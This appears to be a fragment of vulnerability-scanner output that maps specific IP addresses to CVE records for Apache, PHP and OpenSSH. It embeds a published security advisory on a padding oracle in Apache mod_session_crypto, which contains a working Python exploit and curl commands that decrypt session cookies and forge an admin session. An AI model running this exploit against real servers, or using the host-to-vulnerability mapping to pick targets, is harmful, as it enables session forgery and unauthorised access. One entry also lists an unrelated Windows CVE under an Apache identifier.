                "description": "The deflate_in_filter function in mod_deflate.c in the mod_deflate module in the Apache HTTP Server before 2.4.10, when request body decompression is enabled, allows remote attackers to cause a denial of service (resource consumption) via crafted request data that decompresses to a much larger size.",
                "osvdb": [],
                "bid": [
                    68745
                ],
                "cve": [
                    "CVE-2014-0118"
                ],
                "msb": []
            }
        ],
        "CVE-2016-0736": [
            {
                "source": "CVE",
                "_id": "2016-0736",
                "description": "In Apache HTTP Server versions 2.4.0 to 2.4.23, mod_session_crypto was encrypting its data/cookie using the configured ciphers with possibly either CBC or ECB modes of operation (AES256-CBC by default), hence no selectable or builtin authenticated encryption. This made it vulnerable to padding oracle attacks, particularly with CBC.",
                "osvdb": [],
                "bid": [
                    95078
                ],
                "cve": [
                    "CVE-2016-0736"
                ],
                "msb": []
            },
            {
                "code": "'''\r\nAdvisory: Padding Oracle in Apache mod_session_crypto\r\n\r\nDuring a penetration test, RedTeam Pentesting discovered a Padding\r\nOracle vulnerability in mod_session_crypto of the Apache web server.\r\nThis vulnerability can be exploited to decrypt the session data and even\r\nencrypt attacker-specified data.\r\n\r\n\r\nDetails\r\n=======\r\n\r\nProduct: Apache HTTP Server mod_session_crypto\r\nAffected Versions: 2.3 to 2.5\r\nFixed Versions: 2.4.25\r\nVulnerability Type: Padding Oracle\r\nSecurity Risk: high\r\nVendor URL: https://httpd.apache.org/docs/trunk/mod/mod_session_crypto.html\r\nVendor Status: fixed version released\r\nAdvisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2016-001.txt\r\nAdvisory Status: published\r\nCVE: CVE-2016-0736\r\nCVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0736\r\n\r\n\r\nIntroduction\r\n============\r\n\r\nThe module mod_session_crypto of the Apache HTTP Server can be used in\r\nconjunction with the modules mod_session and mod_session_cookie to store\r\nsession data in an encrypted cookie within the users' browsers. This\r\navoids server-side session state so that incoming HTTP requests can be\r\neasily distributed amongst a number of application web servers which do\r\nnot need to share session state.\r\n\r\n\r\nMore Details\r\n============\r\n\r\nThe module mod_session_crypto uses symmetric cryptography to encrypt and\r\ndecrypt session data and uses mod_session to store the encrypted data in\r\na cookie (usually called \"session\") within the user's browser. The\r\ndecrypted session is then made available to the application in an\r\nenvironment variable (in case of a CGI script) or in a custom HTTP\r\nrequest header. The application can add a custom HTTP response header\r\n(usually \"X-Replace-Session\") which instructs the HTTP server to replace\r\nthe session's content with the value of the header. Detailed\r\ninstructions to set up mod_session and mod_session_crypto can be found\r\nin the documentation:\r\nhttps://httpd.apache.org/docs/2.4/mod/mod_session.html#basicexamples\r\n\r\nThe module mod_session_crypto is configured to use either 3DES or AES\r\nwith various key sizes, defaulting to AES256. Encryption is handled by\r\nthe function \"encrypt_string\":\r\n\r\nmodules/session/mod_session_crypto.c\r\n------------------------------------------------------------------------\r\n/**\r\n * Encrypt the string given as per the current config.\r\n *\r\n * Returns APR_SUCCESS if successful.\r\n */\r\nstatic apr_status_t encrypt_string(request_rec * r, const apr_crypto_t *f,\r\n        session_crypto_dir_conf *dconf, const char *in, char **out)\r\n{\r\n[...]\r\n    apr_crypto_key_t *key = NULL;\r\n[...]\r\n    const unsigned char *iv = NULL;\r\n[...]\r\n\r\n    /* use a uuid as a salt value, and prepend it to our result */\r\n    apr_uuid_get(&salt);\r\n\r\n[...]\r\n\r\n    res = apr_crypto_passphrase(&key, &ivSize, passphrase,\r\n            strlen(passphrase),\r\n            (unsigned char *) (&salt), sizeof(apr_uuid_t),\r\n            *cipher, APR_MODE_CBC, 1, 4096, f, r->pool);\r\n\r\n[...]\r\n\r\n    res = apr_crypto_block_encrypt_init(&block, &iv, key, &blockSize, r->pool);\r\n[...]\r\n    res = apr_crypto_block_encrypt(&encrypt, &encryptlen, (unsigned char *)in,\r\n            strlen(in), block);\r\n[...]\r\n    res = apr_crypto_block_encrypt_finish(encrypt + encryptlen, &tlen, block);\r\n[...]\r\n\r\n    /* prepend the salt and the iv to the result */\r\n    combined = apr_palloc(r->pool, ivSize + encryptlen + sizeof(apr_uuid_t));\r\n    memcpy(combined, &salt, sizeof(apr_uuid_t));\r\n    memcpy(combined + sizeof(apr_uuid_t), iv, ivSize);\r\n    memcpy(combined + sizeof(apr_uuid_t) + ivSize, encrypt, encryptlen);\r\n\r\n    /* base64 encode the result */\r\n    base64 = apr_palloc(r->pool, apr_base64_encode_len(ivSize + encryptlen +\r\n                    sizeof(apr_uuid_t) + 1)\r\n            * sizeof(char));\r\n[...]\r\n    return res;\r\n}\r\n------------------------------------------------------------------------\r\n\r\nThe source code shows that an encryption key is derived from the\r\nconfigured password and a randomly chosen salt by calling the function\r\n\"apr_crypto_passphrase\". This function internally uses PBKDF2 to derive\r\nthe key. The data is then encrypted and the salt and IV prepended to the\r\nencrypted data. Before returning to the caller, the result is encoded as\r\nbase64.\r\n\r\nThis procedure does not guarantee integrity of the ciphertext, so the\r\nApache module is unable to detect whether a session sent back to the\r\nserver has been tampered with. Depending on the application this often\r\nmeans that attackers are able to exploit a Padding Oracle vulnerability.\r\nThis allows decrypting the session and encrypting arbitrary data chosen\r\nby the attacker.\r\n\r\n\r\nProof of Concept\r\n================\r\n\r\nThe vulnerability can be reproduced as follows. First, the modules\r\nmod_session, mod_session_crypto and mod_session_cookie are enabled and\r\nconfigured:\r\n\r\n------------------------------------------------------------------------\r\nSession On\r\nSessionEnv On\r\nSessionCookieName session path=/\r\nSessionHeader X-Replace-Session\r\nSessionCryptoPassphrase RedTeam\r\n------------------------------------------------------------------------\r\n\r\nIn addition, CGI scripts are enabled for a folder and the following CGI\r\nscript is saved as \"status.rb\" and is made available to clients:\r\n\r\n------------------------------------------------------------------------\r\n#!/usr/bin/env ruby\r\n\r\nrequire 'cgi'\r\n\r\ncgi = CGI.new\r\ndata = CGI.parse(ENV['HTTP_SESSION'])\r\n\r\nif data.has_key? 'username'\r\n        puts\r\n        puts \"your username is %s\" % data['username']\r\n        exit\r\nend\r\n\r\nputs \"X-Replace-Session: username=guest&timestamp=\" + Time.now.strftime(\"%s\")\r\nputs\r\nputs \"not logged in\"\r\n------------------------------------------------------------------------\r\n\r\nOnce the CGI script is correctly set up, the command-line HTTP client curl\r\ncan be used to access it:\r\n\r\n------------------------------------------------------------------------\r\n$ curl -i http://127.0.0.1:8080/cgi-bin/status.rb\r\nHTTP/1.1 200 OK\r\nDate: Tue, 19 Jan 2016 13:23:19 GMT\r\nServer: Apache/2.4.10 (Ubuntu)\r\nSet-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ\r\n   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/\r\nCache-Control: no-cache\r\nSet-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ\r\n   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-ruby\r\n\r\nnot logged in\r\n------------------------------------------------------------------------\r\n\r\nThe example shows that a new encrypted cookie with the name \"session\" is\r\nreturned, and the response body contains the text \"not logged in\".\r\nCalling the script again with the cookie just returned reveals that the\r\nusername in the session is set to \"guest\":\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\\\r\nLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU= \\\r\nhttp://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nyour username is guest\r\n------------------------------------------------------------------------\r\n\r\nSending a modified cookie ending in \"u=\" instead of \"U=\" will invalidate\r\nthe padding at the end of the ciphertext, so the session cannot be\r\ndecrypted correctly and is therefore not passed to the CGI script, which\r\nreturns the text \"not logged in\" again:\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\\\r\nLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRu= \\\r\nhttp://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nnot logged in\r\n------------------------------------------------------------------------\r\n\r\nThis verifies the existence of the Padding Oracle vulnerability. The\r\nPython library[1] python-paddingoracle was then used to implement\r\ndecrypting the session by exploiting the Padding Oracle vulnerability.\r\n\r\nexploit.py\r\n------------------------------------------------------------------------\r\n'''\r\n\r\nfrom paddingoracle import BadPaddingException, PaddingOracle\r\nfrom base64 import b64encode, b64decode\r\nimport requests\r\n\r\nclass PadBuster(PaddingOracle):\r\n    def __init__(self, valid_cookie, **kwargs):\r\n        super(PadBuster, self).__init__(**kwargs)\r\n        self.wait = kwargs.get('wait', 2.0)\r\n        self.valid_cookie = valid_cookie\r\n\r\n    def oracle(self, data, **kwargs):\r\n        v = b64encode(self.valid_cookie+data)\r\n\r\n        response = requests.get('http://127.0.0.1:8080/cgi-bin/status.rb',\r\n                cookies=dict(session=v), stream=False, timeout=5, verify=False)\r\n\r\n        if 'username' in response.content:\r\n            logging.debug('No padding exception raised on %r', v)\r\n            return\r\n\r\n        raise BadPaddingException\r\n\r\nif __name__ == '__main__':\r\n    import logging\r\n    import sys\r\n\r\n    if not sys.argv[2:]:\r\n        print 'Usage: [encrypt|decrypt] <session value> <plaintext>'\r\n        sys.exit(1)\r\n\r\n    logging.basicConfig(level=logging.WARN)\r\n    mode = sys.argv[1]\r\n    session = b64decode(sys.argv[2])\r\n    padbuster = PadBuster(session)\r\n\r\n    if mode == \"decrypt\":\r\n        cookie = padbuster.decrypt(session[32:], block_size=16, iv=session[16:32])\r\n        print('Decrypted session:\\n%r' % cookie)\r\n    elif mode == \"encrypt\":\r\n        key = session[0:16]\r\n        plaintext = sys.argv[3]\r\n\r\n        s = padbuster.encrypt(plaintext, block_size=16)\r\n\r\n        data = b64encode(key+s[0:len(s)-16])\r\n        print('Encrypted session:\\n%s' % data)\r\n    else:\r\n        print \"invalid mode\"\r\n        sys.exit(1)\r\n\r\n'''\r\n------------------------------------------------------------------------\r\n\r\nThis Python script can then be used to decrypt the session:\r\n\r\n------------------------------------------------------------------------\r\n$ time python exploit.py decrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\\\r\nHztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=\r\nDecrypted session:\r\nb'username=guest&timestamp=1453282205\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r'\r\n\r\nreal    6m43.088s\r\nuser    0m15.464s\r\nsys 0m0.976s\r\n------------------------------------------------------------------------\r\n\r\nIn this sample application, the username and a timestamp are included in\r\nthe session data. The Python script can also be used to encrypt a new\r\nsession containing the username \"admin\":\r\n\r\n------------------------------------------------------------------------\r\n$ time python exploit.py encrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\\\r\nHztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYB\\\r\nRU= username=admin\r\n\r\nEncrypted session:\r\nsxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7zmQ/GLFjF4pcXY\r\n\r\nreal3m38.002s\r\nusers0m8.536s\r\nsys0m0.512s\r\n\r\n------------------------------------------------------------------------\r\n\r\nSending this newly encrypted session to the server shows that the\r\nusername is now \"admin\":\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7\\\r\nzmQ/GLFjF4pcXY http://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nyour username is admin\r\n------------------------------------------------------------------------\r\n\r\n\r\nWorkaround\r\n==========\r\n\r\nUse a different means to store the session, e.g. in a database by using\r\nmod_session_dbd.\r\n\r\n\r\nFix\r\n===\r\n\r\nUpdate to Apache HTTP version 2.4.25 (see [2]).\r\n\r\n\r\nSecurity Risk\r\n=============\r\n\r\nApplications which use mod_session_crypto usually store sensitive values\r\nin the session and rely on an attacker's inability to decrypt or modify\r\nthe session. Successful exploitation of the Padding Oracle vulnerability\r\nsubverts this mechanism and allows to construct sessions with arbitrary\r\nattacker-specified content. Depending on the application this may\r\ncompletely subvert the application's security. Therefore, this\r\nvulnerability poses a high risk.\r\n\r\n\r\nTimeline\r\n========\r\n\r\n2016-01-11 Vulnerability identified\r\n2016-01-12 Customer approved disclosure to vendor\r\n2016-01-12 CVE number requested\r\n2016-01-20 Vendor notified\r\n2016-01-22 Vendor confirmed the vulnerability\r\n2016-02-03 Vendor provided patch\r\n2016-02-04 Apache Security Team assigned CVE number\r\n2016-03-03 Requested status update from vendor, no response\r\n2016-05-02 Requested status update from vendor, no response\r\n2016-07-14 Requested status update and roadmap from vendor\r\n2016-07-21 Vendor confirms working on a new released and inquired whether the\r\n           patch fixes the vulnerability\r\n2016-07-22 RedTeam confirms\r\n2016-08-24 Requested status update from vendor\r\n2016-08-29 Vendor states that there is no concrete timeline\r\n2016-12-05 Vendor announces a release\r\n2016-12-20 Vendor released fixed version\r\n2016-12-23 Advisory released\r\n\r\n\r\nReferences\r\n==========\r\n\r\n[1] https://github.com/mwielgoszewski/python-paddingoracle\r\n[2] http://httpd.apache.org/security/vulnerabilities_24.html\r\n\r\n\r\nRedTeam Pentesting GmbH\r\n=======================\r\n\r\nRedTeam Pentesting offers individual penetration tests performed by a\r\nteam of specialised IT-security experts. Hereby, security weaknesses in\r\ncompany networks or products are uncovered and can be fixed immediately.\r\n\r\nAs there are only few experts in this field, RedTeam Pentesting wants to\r\nshare its knowledge and enhance the public knowledge with research in\r\nsecurity-related areas. The results are made available as public\r\nsecurity advisories.\r\n\r\nMore information about RedTeam Pentesting can be found at:\r\nhttps://www.redteam-pentesting.de/\r\n'''",
                "description": "Apache mod_session_crypto - Padding Oracle",
                "author": "RedTeam Pentesting GmbH",
                "_id": 40961,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2016-12-23T00:00:00+00:00",
                "cve": [
                    "CVE-2016-0736"
                ],
                "type": "webapps",
                "port": 0
            }
        ],
        "CVE-2015-3185": [
            {
                "source": "CVE",
                "_id": "2015-3185",
                "description": "The ap_some_auth_required function in server/request.c in the Apache HTTP Server 2.4.x before 2.4.14 does not consider that a Require directive may be associated with an authorization setting rather than an authentication setting, which allows remote attackers to bypass intended access restrictions in opportunistic circumstances by leveraging the presence of a module that relies on the 2.2 API behavior.",
                "osvdb": [],
                "bid": [
                    75965
                ],
                "cve": [
                    "CVE-2015-3185"
                ],
                "msb": []
            }
        ],
        "CVE-2015-3184": [
            {
                "source": "CVE",
                "_id": "2015-3184",
                "description": "mod_authz_svn in Apache Subversion 1.7.x before 1.7.21 and 1.8.x before 1.8.14, when using Apache httpd 2.4.x, does not properly restrict anonymous access, which allows remote anonymous users to read hidden files via the path name.",
                "osvdb": [],
                "bid": [
                    76274
                ],
                "cve": [
                    "CVE-2015-3184"
                ],
                "msb": []
            }
        ],
        "CVE-2018-1312": [
            {
                "source": "CVE",
                "_id": "2018-1312",
                "description": "In Apache httpd 2.2.0 to 2.4.29, when generating an HTTP Digest authentication challenge, the nonce sent to prevent reply attacks was not correctly generated using a pseudo-random seed. In a cluster of servers using a common Digest authentication configuration, HTTP requests could be replayed across servers by an attacker without detection.",
                "osvdb": [],
                "bid": [
                    103524
                ],
                "cve": [
                    "CVE-2018-1312"
                ],
                "msb": []
            }
        ],
        "CVE-2016-4975": [
            {
                "source": "CVE",
                "_id": "2016-4975",
                "description": "Possible CRLF injection allowing HTTP response splitting attacks for sites which use mod_userdir. This issue was mitigated by changes made in 2.4.25 and 2.2.32 which prohibit CR or LF injection into the \"Location\" or other outbound header key or value. Fixed in Apache HTTP Server 2.4.25 (Affected 2.4.1-2.4.23). Fixed in Apache HTTP Server 2.2.32 (Affected 2.2.0-2.2.31).",
                "osvdb": [],
                "bid": [
                    105093
                ],
                "cve": [
                    "CVE-2016-4975"
                ],
                "msb": []
            }
        ],
        "CVE-2016-8612": [
            {
                "source": "CVE",
                "_id": "2016-8612",
                "description": "Apache HTTP Server mod_cluster before version httpd 2.4.23 is vulnerable to an Improper Input Validation in the protocol parsing logic in the load balancer resulting in a Segmentation Fault in the serving httpd process.",
                "osvdb": [],
                "bid": [
                    94939
                ],
                "cve": [
                    "CVE-2016-8612"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-8612",
                "description": "A Denial Of Service vulnerability exists when Connected User Experiences and Telemetry Service fails to validate certain function values, aka \"Connected User Experiences and Telemetry Service Denial of Service Vulnerability.\" This affects Windows Server 2016, Windows 10, Windows Server 2019, Windows 10 Servers.",
                "osvdb": [],
                "bid": [
                    106087
                ],
                "cve": [
                    "CVE-2018-8612"
                ],
                "msb": []
            }
        ],
        "CVE-2014-0226": [
            {
                "source": "CVE",
                "_id": "2014-0226",
                "description": "Race condition in the mod_status module in the Apache HTTP Server before 2.4.10 allows remote attackers to cause a denial of service (heap-based buffer overflow), or possibly obtain sensitive credential information or execute arbitrary code, via a crafted request that triggers improper scoreboard handling within the status_handler function in modules/generators/mod_status.c and the lua_ap_scoreboard_worker function in modules/lua/lua_request.c.",
                "osvdb": [
                    109216
                ],
                "bid": [
                    68678
                ],
                "cve": [
                    "CVE-2014-0226"
                ],
                "msb": []
            }
        ]
    },
    "152.14.136.163": {
        "CVE-2010-2068": [
            {
                "source": "CVE",
                "_id": "2010-2791",
                "description": "mod_proxy in httpd in Apache HTTP Server 2.2.9, when running on Unix, does not close the backend connection if a timeout occurs when reading a response from a persistent connection, which allows remote attackers to obtain a potentially sensitive response intended for a different client in opportunistic circumstances via a normal HTTP request.  NOTE: this is the same issue as CVE-2010-2068, but for a different OS and set of affected versions.",
                "osvdb": [],
                "bid": [
                    42102
                ],
                "cve": [
                    "CVE-2010-2791"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2010-2068",
                "description": "mod_proxy_http.c in mod_proxy_http in the Apache HTTP Server 2.2.9 through 2.2.15, 2.3.4-alpha, and 2.3.5-alpha on Windows, NetWare, and OS/2, in certain configurations involving proxy worker pools, does not properly detect timeouts, which allows remote attackers to obtain a potentially sensitive response intended for a different client in opportunistic circumstances via a normal HTTP request.",
                "osvdb": [],
                "bid": [
                    40827
                ],
                "cve": [
                    "CVE-2010-2068"
                ],
                "msb": []
            }
        ]
    },
    "152.14.136.182": {},
    "152.14.136.191": {
        "CVE-2018-19935": [
            {
                "source": "CVE",
                "_id": "2018-19935",
                "description": "ext/imap/php_imap.c in PHP 5.x and 7.x before 7.3.0 allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via an empty string in the message argument to the imap_mail function.",
                "osvdb": [],
                "bid": [
                    106143
                ],
                "cve": [
                    "CVE-2018-19935"
                ],
                "msb": []
            }
        ]
    },
    "152.14.136.193": {},
    "152.14.136.216": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ],
        "CVE-2017-15906": [
            {
                "source": "CVE",
                "_id": "2017-15906",
                "description": "The process_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write operations in readonly mode, which allows attackers to create zero-length files.",
                "osvdb": [],
                "bid": [
                    101552
                ],
                "cve": [
                    "CVE-2017-15906"
                ],
                "msb": []
            }
        ]
    }
}